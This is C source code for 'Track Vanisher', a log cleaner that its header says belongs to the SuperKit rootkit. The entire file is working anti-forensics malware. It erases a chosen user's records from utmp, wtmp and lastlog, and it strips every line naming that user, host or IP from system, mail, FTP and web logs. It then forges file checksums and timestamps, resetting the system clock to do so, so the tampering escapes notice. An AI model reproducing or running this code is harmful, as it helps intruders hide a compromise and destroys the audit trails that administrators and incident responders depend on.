// Log cleaner, adapted for SuperKit by mostarac <mostar@hotmail.com>
#include <stdio.h>
#include <fcntl.h>		
#include <utmp.h>		
#include <sys/types.h>		
#include <unistd.h>
#include <lastlog.h>
#include <pwd.h>
#include <sys/stat.h>
#include <sys/time.h>

#include "../include/izbtrag.h"

char *varlogs[] = {MESSAGES, SECURE, XFERLOG, MAILLOG, WARN, MAIL, HTTPDA,HTTPDE} ; 
char *newlogs[] = {"messages.hm", "secure.hm","xferlog.hm","maillog.hm","warn.hm", "mail.hm", "httpda.hm", "httpde.hm"} ;  
char buffer[MAXBUFF] ;


/*This function has been modified by me*/
/*Original code (fix.c) from Idefix!!!*/
sum(char *file,unsigned *crc)
{
	unsigned sum;
	int i, c;
	FILE *f;
	long nbytes;
	int errflg=0;

	if(!(f=fopen(file, "r"))) {
		fprintf(stderr, "%s: Can't open %s\n",RK_PROG,file);
		return(-1);
	}

	sum=0;
	nbytes=0;

	while((c=getc(f))!=EOF) {
		nbytes++;
		if(sum&01)
			sum=(sum>>1)+0x8000;
		else
			sum>>=1;
		sum+=c;
		sum&=0xFFFF;
	}

	if(ferror(f)) {
		errflg++;
		fprintf(stderr, "%s: read error on %s\n",RK_PROG,file);
		return(-1);
	}

	fclose(f);
	*crc=sum;
	return(0);
}

/*This function has been modified by me*/
/*Original code (fix.c) from Idefix!!!*/
int fixer(int x)
{
unsigned orig_crc,current_crc,temp;
unsigned char diff1,diff2,buf[20];
struct stat statbuf;
struct timeval ftime[2], otime, ntime;
struct timezone tzp;
long position;
FILE *f;
int i,fix=1;
char syscmd[100];

if(stat(varlogs[x],&statbuf)<0)
	ERR("stat")

if(sum(varlogs[x],&orig_crc)<0)
	return(0);
if(sum(newlogs[x],&current_crc)<0)
	return(0);
sprintf(syscmd,"/bin/mv %s %s",newlogs[x],varlogs[x]);
system(syscmd);

diff1=(orig_crc&0xFF)-(current_crc&0xFF);
temp=(current_crc+diff1)&0xFFFF;
	
for(i=0;i<8;i++) {
	if(temp&1)
		temp=(temp>>1)+0x8000;
	else
		temp>>=1;
}
diff2=((orig_crc&0xFF00)>>8)-(temp&0xFF);
temp=(temp+diff2)&0xFFFF;

for(i=0;i<8;i++) {
	if(temp&1)
		temp=(temp>>1)+0x8000;
	else
		temp>>=1;
}

if((temp-orig_crc)==1)
	diff1=diff1-1;

if(!(f=fopen(varlogs[x], "r+b"))) {
	fprintf(stderr, "Can't open %s\n",varlogs[x]);
	return(0);
}
fseek(f,0L,SEEK_END);
position=ftell(f)-17;
fseek(f,position,SEEK_SET);
fread(buf,17,1,f);

for(i=0;i<17;i++)
	if(buf[i]!=0) {
		fprintf(stderr,"Last 17 bytes not zero! Can't fix checksum!\n"); 		                 
                fix=0;
		break;
	}

if(fix) {
	buf[0]=diff1;
	buf[8]=diff2;
	fseek(f,position,SEEK_SET);
	fwrite(buf,17,1,f);
}
fclose(f);	
	
if(chmod(varlogs[x],statbuf.st_mode))
	ERR("chmod")
	
if(chown(varlogs[x],statbuf.st_uid,statbuf.st_gid))
	ERR("chown")
	
ftime[0].tv_sec=statbuf.st_atime;
ftime[1].tv_sec=statbuf.st_mtime;
ntime.tv_sec=statbuf.st_ctime;
ftime[0].tv_usec=ftime[1].tv_usec=ntime.tv_usec=0;
	
	
if(gettimeofday(&otime,&tzp))
	ERR("gettimeofday")
	
if(settimeofday(&ntime,&tzp))
	ERR("settimeofday")
	
if(utimes(varlogs[x],ftime))
	ERR("utimes")

if(settimeofday(&otime,&tzp))
	ERR("settimeofday")

fprintf(stderr,"File %s fixed\n\n",varlogs[x]);
return(1);	
}


int main(int argc, char *argv[])
{
struct utmp ut ;		
struct lastlog ll ;		
struct passwd *pass ;
int i, size, fin, fout,z;
FILE *pfile;
FILE *pfile2;


char user[10] ;		
char host[100] ;		
char host_ip[17] ;


/*Usage of the programm*/
if (argc!=4)
{
   printf ("\n");
   printf ("Track Vanisher by Mos Tarac\n");
   fprintf(stderr, "Usage: %s <user> <host> <IP> Example: ./izbtrag syscall mypc.myhost.nu 66.66.66.66\n\n",argv[0]) ;

   exit () ;
}

/***************************
* OK Let's start with UTMP *
***************************/
size = sizeof(ut) ;
strcpy (user, argv[1]) ;
fin = open (UTMP, O_RDWR) ;
if (fin < 0)
{
fprintf(stderr, "\nUtmp permission denied.Getting outta here!!\n");  
close (fin) ;
exit();
}
else
{
while (read (fin, &ut, size) == size) {
       if (!strncmp(ut.ut_user, user, strlen(user))) {
                   memset(&ut, 0, size);
                   lseek(fin, -1*size, SEEK_CUR);
                   write (fin, &ut, size);
               }
        }
        close (fin);
        printf("\nutmp target processed.");
}
/***************************
* OK Let's go on with WTMP *
***************************/
	strcpy (host, argv[2]) ;
  strcpy(host_ip, argv[3]) ;
	
	fin = open(WTMP, O_RDONLY) ;
	if (fin < 0) {
		fprintf(stderr, "\nWtmp permission denied.Getting outta here.\n") ; 		                              
   close (fin) ; 		exit () ;
	}
	fout = open("wtmp.hm", O_WRONLY|O_CREAT) ;
	if (fout < 0) {
		fprintf(stderr, "\nProblems targeting wtmp. Getting outta here.\n") ;	
		close (fout) ;
		exit () ;
	}
	else {
		while (read (fin, &ut, size) == size) {
			if ( (!strcmp(ut.ut_user, user)) || (!strncmp(ut.ut_host, host, strlen(host))) ) {
 		 	/* let it go into oblivion */  ; 	
	} 			
        else write (fout, &ut, size) ; 		}
		close (fin) ;
		close (fout) ;
		if ((system("/bin/mv wtmp.hm /var/log/wtmp") < 0) &&
		    (system("/bin/mv wtmp.hm /var/log/wtmp") == 127)) {
			fprintf(stderr, "\nAch. Couldn't replace %s .", WTMP) ;
		}
                system("/bin/chmod 644 /var/log/wtmp") ;
		printf("\nwtmp target processed.") ;
	}
/***************************
* OK Let's look at LASTLOG *
***************************/
	size = sizeof(ll) ;
	fin = open(LASTLOG, O_RDWR) ;
	if (fin < 0) {
		fprintf(stderr, "\nLastlog permission denied.Getting outta here.\n") ; 		
                close (fin) ;
		exit () ;
	}
	else {
		pass = getpwnam(user) ;
		lseek(fin, size*pass->pw_uid, SEEK_SET) ;
		read(fin, &ll, size) ;
		ll.ll_time = 0 ;
		strncpy (ll.ll_line, "      ", 5) ;
		strcpy (ll.ll_host, " ") ;
		lseek(fin, size*pass->pw_uid, SEEK_SET) ;
		write(fin, &ll, size) ;
		close (fin) ;
		printf("\nlastlog target processed.\n") ;
	}

/**************************
* OK moving to /var ....  *
**************************/
i=0;
while (i<8) {
fprintf(stderr,"Processing %s\t", varlogs[i]) ;
pfile = fopen (varlogs[i],"r");
if (!pfile)
{
   printf("%s not found\n\n",varlogs[i]);
   i++;
   continue ;
}


pfile2 = fopen (newlogs[i],"w");
if (!pfile2)
{
  printf("Couldn't create backup file! You have to have write permission to the folder!! %s \n\n", newlogs[i]);   
  i++;   
  continue;
}
else {
      while (fgets(buffer, MAXBUFF, pfile) != NULL) {
      if ((!strstr(buffer, user)) && (!strstr(buffer, host))&&(!strstr(buffer, host_ip)))  { 			
fputs(buffer,pfile2) ;  } }
}
fclose (pfile);
fclose (pfile2);
z=fixer(i);
if(z=1)
i++;
}
printf ("\n\n");
printf ("-= EXCELLENT =- Your tracks have been removed!!!\n");
}



